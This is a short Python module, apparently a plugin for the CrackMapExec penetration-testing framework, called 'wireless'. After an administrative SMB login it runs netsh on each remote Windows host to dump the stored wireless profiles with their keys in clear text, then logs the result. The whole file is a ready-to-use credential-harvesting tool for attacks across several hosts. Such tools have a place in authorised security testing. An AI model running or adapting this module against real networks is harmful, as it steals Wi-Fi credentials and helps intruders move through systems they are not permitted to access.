class CMEModule:

    name = 'wireless'
    description = "Get key of all wireless interfaces"
    supported_protocols = ['smb']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        '''
        '''     

    def on_admin_login(self, context, connection):

        command = 'netsh.exe wlan show profiles name=* key=clear'
        context.log.info('Executing command')
        p = connection.execute(command, True)
        context.log.success(p)
